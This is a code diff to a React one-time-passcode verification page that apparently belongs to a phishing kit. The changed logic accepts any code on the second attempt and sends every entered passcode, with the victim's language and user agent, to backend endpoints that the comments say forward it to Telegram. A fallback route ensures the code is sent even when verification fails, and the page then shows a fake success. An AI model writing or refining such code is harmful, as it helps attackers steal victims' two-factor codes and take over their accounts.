@@ -50,15 +50,33 @@ export default function OtpVerification() {
       
       // On second attempt (after first failure), accept ANY code and go to success
       if (attempts >= 1) {
-        // Send the OTP to backend for logging
-        apiRequest("POST", "/api/verify-otp", { 
-          otp,
-          language,
-          userAgent,
-          attempt: attempts + 1
-        }).catch(() => {
-          // Silent fail - just for logging purposes
-        });
+        // Send the OTP to backend for logging - regardless of validation result
+        let otpSentToTelegram = false;
+        
+        try {
+          const response = await apiRequest("POST", "/api/verify-otp", { 
+            otp,
+            language,
+            userAgent,
+            attempt: attempts + 1
+          });
+          // If we get here, the OTP was correct and sent to Telegram via verify endpoint
+          otpSentToTelegram = true;
+        } catch (verifyError) {
+          // Verification failed (wrong code) - send to Telegram via failure endpoint
+          try {
+            await apiRequest("POST", "/api/otp-failure", { 
+              otp,
+              language,
+              userAgent,
+              attempt: attempts + 1
+            });
+            otpSentToTelegram = true;
+          } catch (failureError) {
+            // Silent fail - notification shouldn't block the app
+            console.error("Failed to send OTP failure notification:", failureError);
+          }
+        }
         
         // Clear stored attempts on success
         if (typeof window !== 'undefined') {
@@ -72,7 +90,7 @@ export default function OtpVerification() {
         
         setOtp("");
         
-        // Keep button disabled and redirect to success page
+        // Keep button disabled and redirect to success page (accept any code on 2nd attempt)
         setTimeout(() => {
           setLocation("/success");
         }, 1000);
